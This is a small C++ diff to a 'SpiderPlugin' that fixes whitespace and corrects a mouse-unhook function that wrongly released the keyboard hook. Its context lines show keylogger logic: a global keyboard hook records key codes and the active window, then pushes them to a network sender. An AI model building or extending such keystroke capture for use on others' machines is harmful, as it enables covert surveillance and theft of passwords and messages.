@@ -455,7 +455,7 @@ namespace spider
 		extractPath(cur);
 		msg.sys.currentWindow.fill(0);
 		std::copy(cur.begin(), cur.end(),
-			  msg.sys.currentWindow.data());
+		          msg.sys.currentWindow.data());
 		translateKey(hooked.vkCode, msg);
 		m_sendToNetwork->push(msg);
 	      }
@@ -563,11 +563,11 @@ namespace spider
       bool SpiderPlugin::unHookMouseWindows()
       {
 	// Un-install global hook
-	if (m_keyboardHookWin)
+	if (m_mouseHookWin)
 	  {
-	    UnhookWindowsHookEx(m_keyboardHookWin);
+	    UnhookWindowsHookEx(m_mouseHookWin);
 	  }
-	m_keyboardHookWin = nullptr;
+	m_mouseHookWin = nullptr;
 	return false;
       }
 
